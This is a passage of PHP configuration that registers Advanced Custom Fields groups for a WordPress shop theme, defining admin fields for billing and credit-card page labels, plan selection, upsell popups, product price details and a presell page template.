                'label' => 'Subtitle',
                'name' => 'subtitle_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0eece1274ca',
                'label' => 'Content Text',
                'name' => 'content_text_ph',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a0eece1274c9',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a0eece0274c8',
                'label' => 'Background Color',
                'name' => 'background_color_ph',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a0eecdf274c7',
                'label' => 'Background Image',
                'name' => 'background_image_ph',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a0eecde274c6',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_ph',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a0eecdd274c5',
                'label' => 'Background Position',
                'name' => 'background_position_ph',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a0eecdd274c4',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_ph',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a0eecdc274c3',
                'label' => 'Background Size',
                'name' => 'background_size_ph',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a0eecdb274c2',
                'label' => 'Shipping',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a0eecdb274c1',
                'label' => 'Title',
                'name' => 'title_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0eecda274c0',
                'label' => 'Content Text',
                'name' => 'content_text_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0eecd9274bf',
                'label' => 'Billing',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a0eecd8274be',
                'label' => 'Title',
                'name' => 'title_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0eecd8274bd',
                'label' => 'Content Text',
                'name' => 'content_text_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0eecd7274bc',
                'label' => 'Your Order',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a0eecd6274bb',
                'label' => 'Title',
                'name' => 'title_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0eecd5274ba',
                'label' => 'Content Text',
                'name' => 'content_text_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0f0d3adbfe7',
                'label' => 'Shipping Estimate',
                'name' => 'shipping_estimate',
                'type' => 'textarea',
                'instructions' => 'Date shipping estimate : [tpc_shipping_estimate]',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a14361d7f1e9',
                'label' => 'number of days for shipment',
                'name' => 'number_of_days_for_shipment',
                'type' => 'number',
                'instructions' => '[tpc_shipping_estimate]',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'min' => 1,
                'max' => '',
                'step' => '',
            ),
            array (
                'key' => 'field_5a0eecd2274b4',
                'label' => 'Title For Terms And Conditions',
                'name' => 'title_terms_conditions',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a0eecd3274b6',
                'label' => 'Text Of Terms And Conditions',
                'name' => 'text_terms_conditions',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a441fab305ae',
                'label' => 'Credit Card',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a441fba305dd',
                'label' => 'Secure Credit',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Secure Credit</strong></p>',
            ),
            array (
                'key' => 'field_5a441fb9305dc',
                'label' => 'Security Image',
                'name' => 'security_image',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a441fb9305db',
                'label' => 'Title',
                'name' => 'title_security',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb9305da',
                'label' => 'Description',
                'name' => 'description_security',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb9305d9',
                'label' => 'Card Type',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Card Type</strong></p>',
            ),
            array (
                'key' => 'field_5a441fb9305d8',
                'label' => 'Label',
                'name' => 'label_ct',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb8305d7',
                'label' => 'Description',
                'name' => 'description_ct',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb8305d6',
                'label' => 'Card Image',
                'name' => 'card_image',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a441fb8305d5',
                'label' => 'Card Number',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Card Number</strong></p>',
            ),
            array (
                'key' => 'field_5a441fb8305d4',
                'label' => 'Label',
                'name' => 'label_cn',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb8305d3',
                'label' => 'Description',
                'name' => 'description_cn',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb7305d2',
                'label' => 'Expiry',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Expiry</strong></p>',
            ),
            array (
                'key' => 'field_5a441fb7305d1',
                'label' => 'Label',
                'name' => 'label_ex',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb7305d0',
                'label' => 'Description',
                'name' => 'description_ex',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb7305cf',
                'label' => 'Card Code',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Card Code</strong></p>',
            ),

            array (
                'key' => 'field_5a441fb7305ce',
                'label' => 'Label',
                'name' => 'label_cc',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb7305cd',
                'label' => 'Description',
                'name' => 'description_cc',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a441fb6305cc',
                'label' => 'CVC Image',
                'name' => 'cvc_image',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a441fb6305cb',
                'label' => 'Terms And Conditions',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Terms &amp; Conditions</strong></p>',
            ),
            array (
                'key' => 'field_5a441fb6305ca',
                'label' => 'Check Box Tag',
                'name' => 'check_box_tag',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a4ffc2c11384',
                'label' => 'Select your plan',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a5543242ea96',
                'label' => 'Header',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Header</strong></p>',
            ),
            array (
                'key' => 'field_5a5543322eac2',
                'label' => 'Title',
                'name' => 'title_select_ph',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a5543342eac8',
                'label' => 'Background Color',
                'name' => 'background_color_select_ph',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a5543332eac7',
                'label' => 'Background Image',
                'name' => 'background_image_select_ph',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a5543332eac6',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_select_ph',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a5543332eac5',
                'label' => 'Background Position',
                'name' => 'background_position_select_ph',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a5543332eac4',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_select_ph',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a5543332eac3',
                'label' => 'Background Size',
                'name' => 'background_size_select_ph',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a5543322eabf',
                'label' => 'Body',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Body</strong></p>',
            ),
            array (
                'key' => 'field_5a5543322eabe',
                'label' => 'Title',
                'name' => 'title_select_pb',
                'type' => 'text',
                'instructions' => 'i.e. <span class="psypnewd-wait-text">WAIT!  </span><span class="psypnewd-special-text"><a href="#">Special one time only offer for new VIP Members.</a></span><span class="psypnewd-ask-text"> Do you want to save even more?</span>',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
			array (
				'key' => 'field_5a54da3c5d087',
				'label' => 'Select your plan - Gold',
				'name' => 'select_your_plan_1',
				'type' => 'taxonomy',
				'taxonomy' => 'product_cat',
				'field_type' => 'select',
				'allow_null' => 0,
				'load_save_terms' => 0,
				'return_format' => 'object',
				'multiple' => 0,
			),
			array (
				'key' => 'field_5a54da7d5d088',
				'label' => 'Select your plan - Platinum',
				'name' => 'select_your_plan_2',
				'type' => 'taxonomy',
				'taxonomy' => 'product_cat',
				'field_type' => 'select',
				'allow_null' => 0,
				'load_save_terms' => 0,
				'return_format' => 'object',
				'multiple' => 0,
			),
            array (
                'key' => 'field_5a5543322eac1',
                'label' => 'Background Color',
                'name' => 'background_color_select_pb',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a5543322eac0',
                'label' => 'Background Image',
                'name' => 'background_image_select_pb',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a5543312eabd',
                'label' => 'No thanks',
                'name' => 'no_thanks',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a009f95f6e3d',
                'label' => 'Upsell',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a172af277801',
                'label' => 'Text',
                'name' => 'text_popup',
                'type' => 'text',
                'required' => 1,
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172af277800',
                'label' => 'Title',
                'name' => 'title_popup',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172af2777ff',
                'label' => 'Subtitle',
                'name' => 'subtitle_popup',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172af1777fe',
                'label' => 'Image',
                'name' => 'image_popup',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a172af1777fd',
                'label' => 'Details 1',
                'name' => 'details_1_popup',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a172af1777fc',
                'label' => 'Details 2',
                'name' => 'details_2_popup',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a172af1777fb',
                'label' => 'Price details',
                'name' => 'details_price_popup',
                'type' => 'wysiwyg',
                'required' => 1,
                'instructions' => 'i.e. FOR JUST [tpc_price value="275"] / MONTHLY',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a172af0777fa',
                'label' => 'Call to action text',
                'name' => 'button_text_1',
                'type' => 'text',
                'required' => 1,
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172af0777f9',
                'label' => 'Text for "Continue with my order"',
                'name' => 'button_text_2',
                'type' => 'text',
                'required' => 1,
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-billing-information.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
            ),
        ),
        'menu_order' => -1,
    ));
}

if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_product',
        'title' => 'Product',
        'fields' => array (
            array (
                'key' => 'field_5a19fa8e2a748',
                'label' => 'Price details',
                'name' => 'price_details',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a56512022f18',
                'label' => 'Promotion image',
                'name' => 'promotion_image',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'post_type',
                    'operator' => '==',
                    'value' => 'product',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_prior-collections-2',
        'title' => 'Prior Collections 2',
        'fields' => array (
            array (
                'key' => 'field_5a172af0777f8',
                'label' => 'Image',
                'name' => 'image',
                'type' => 'image',
                'required' => 1,
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a172af0777f7',
                'label' => 'Title',
                'name' => 'title',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172aef777f6',
                'label' => 'Content text',
                'name' => 'content_text',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a172aef777f5',
                'label' => 'Link button',
                'name' => 'link_button',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172aef777f4',
                'label' => 'Button text',
                'name' => 'button_text',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'post_type',
                    'operator' => '==',
                    'value' => 'prior_collections_2',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'permalink',
                1 => 'the_content',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_presell-one',
        'title' => 'Presell One',
        'fields' => array (
			array (
				'key' => 'field_5a6b9103257fd',
				'label' => 'The link is',
				'name' => 'the_link_is',
				'type' => 'radio',
				'choices' => array (
					'internal' => 'Internal',
					'external' => 'External',
				),
				'other_choice' => 0,
				'save_other_choice' => 0,
				'default_value' => '',
				'layout' => 'horizontal',
			),
			array (
				'key' => 'field_5a6b90ca257fc',
				'label' => 'External link for images',
				'name' => 'external_link_for_images',
				'type' => 'text',
				'conditional_logic' => array (
					'status' => 1,
					'rules' => array (
						array (
							'field' => 'field_5a6b9103257fd',
							'operator' => '==',
							'value' => 'external',
						),
					),
					'allorany' => 'all',
				),
				'default_value' => '',
				'placeholder' => '',
				'prepend' => '',
				'append' => '',
				'formatting' => 'html',
				'maxlength' => '',
			),
			array (
				'key' => 'field_5a3e7a0ac02b5',
				'label' => 'Internal link for images',
				'name' => 'link_for_images',
				'type' => 'page_link',
				'conditional_logic' => array (
					'status' => 1,
					'rules' => array (
						array (
							'field' => 'field_5a6b9103257fd',
							'operator' => '==',
							'value' => 'internal',
						),
					),
					'allorany' => 'all',
				),
				'post_type' => array (
					0 => 'page',
				),
				'allow_null' => 0,
				'multiple' => 0,
			),
            array (
                'key' => 'field_5a3d6acd021df',
                'label' => 'Header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a3d3bb629875',
                'label' => 'Logo',
                'name' => 'logo',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3e6bfd48f9f',
                'label' => 'Background color',
                'name' => 'background_color_header',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a3d3cc129877',
                'label' => ' content text left',
                'name' => 'content_text_left',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a3d3d3a29878',
                'label' => 'Background image',
                'name' => 'background_image',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3d3dd629879',
                'label' => 'Content text right',
                'name' => 'content_text_right',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a3e610b87cc0',
                'label' => 'Body',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a3d44f2a8abc',
                'label' => 'Publication date',
                'name' => 'publication_date',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'none',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a3e61e387cc3',
                'label' => 'Title',
                'name' => 'title',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a3e622287cc4',
                'label' => 'Detail',
                'name' => 'detail',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a3e625687cc5',
                'label' => 'Content text 1',
                'name' => 'content_text_1',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a3e634b87cc6',
                'label' => 'Image 1',
                'name' => 'image_1',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3e638587cc7',
                'label' => 'Content text 2',
                'name' => 'content_text_2',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a3e643287cc8',
                'label' => 'Image 2',
                'name' => 'image_2',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3e651987cc9',
                'label' => 'Content text 3',
                'name' => 'content_text_3',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a3e655087ccb',
                'label' => 'Content text 4',
                'name' => 'content_text_4',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a3e656087ccc',
                'label' => 'Vídeo',
                'name' => 'video',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a3e658e87ccd',
                'label' => 'Subtitle 1',
                'name' => 'subtitle_1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a3e65f087cce',
                'label' => 'Content text 5',
                'name' => 'content_text_5',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a3e669787ccf',
                'label' => 'Image 3',
                'name' => 'image_3',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3e670887cd1',
                'label' => 'Content text 6',
                'name' => 'content_text_6',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a3e671c87cd2',
                'label' => 'Subtitle 2',
                'name' => 'subtitle_2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a3e673087cd3',
                'label' => 'Content text 7',
                'name' => 'content_text_7',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a3e674587cd4',
                'label' => 'Image 4',
                'name' => 'image_4',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3e613687cc2',
                'label' => 'Sidebar',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a3e68c812af7',
                'label' => 'Image 1',
                'name' => 'image_1_sidebar',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3e698612af8',
                'label' => 'Image 2',
                'name' => 'image_2_sidebar',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3e612987cc1',
                'label' => 'Footer',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a3e69f912af9',
                'label' => 'Content text',
                'name' => 'content_text_footer',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a3e6ade12afa',
                'label' => 'Logo',
                'name' => 'logo_footer',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a3e6bd048f9e',
                'label' => 'Background color',
                'name' => 'background_color_footer',
                'type' => 'color_picker',
                'default_value' => '',
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'page-presell-one.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -2,
    ));
}
if(function_exists("register_field_group"))
{
	register_field_group(array (
		'id' => 'acf_upsell-templates',
		'title' => 'Upsell Templates',
		'fields' => array (
			array (
				'key' => 'field_5a58e8a41404e',
				'label' => 'Upsell Templates',
				'name' => 'upsell_templates',
				'type' => 'select',
				'choices' => array (
					'template_1' => 'Template 1',
					'template_2' => 'Template 2',
				),
				'default_value' => '',
				'allow_null' => 1,
				'multiple' => 0,
			),
			array (
				'key' => 'field_5a58e8ef14053',
				'label' => 'Template 2',
				'name' => '',
				'type' => 'tab',
				'conditional_logic' => array (
					'status' => 1,
					'rules' => array (
						array (
							'field' => 'field_5a58e8a41404e',
							'operator' => '==',
							'value' => 'template_2',
						),
					),
					'allorany' => 'all',
				),
			),
			array (
				'key' => 'field_5a5915f435994',
				'label' => 'Title',
				'name' => 'title_popup_t2',
				'type' => 'text',
				'default_value' => '',
				'placeholder' => '',
				'prepend' => '',
				'append' => '',
				'formatting' => 'html',
				'maxlength' => '',
			),
			array (
				'key' => 'field_5a59165135996',
				'label' => 'Subtitle',
				'name' => 'subtitle_popup_t2',
				'type' => 'text',
				'default_value' => '',
				'placeholder' => '',
				'prepend' => '',
				'append' => '',
				'formatting' => 'html',
				'maxlength' => '',
			),
			array (
				'key' => 'field_5a59167c35997',
				'label' => 'Details',
				'name' => 'details_popup_t2',
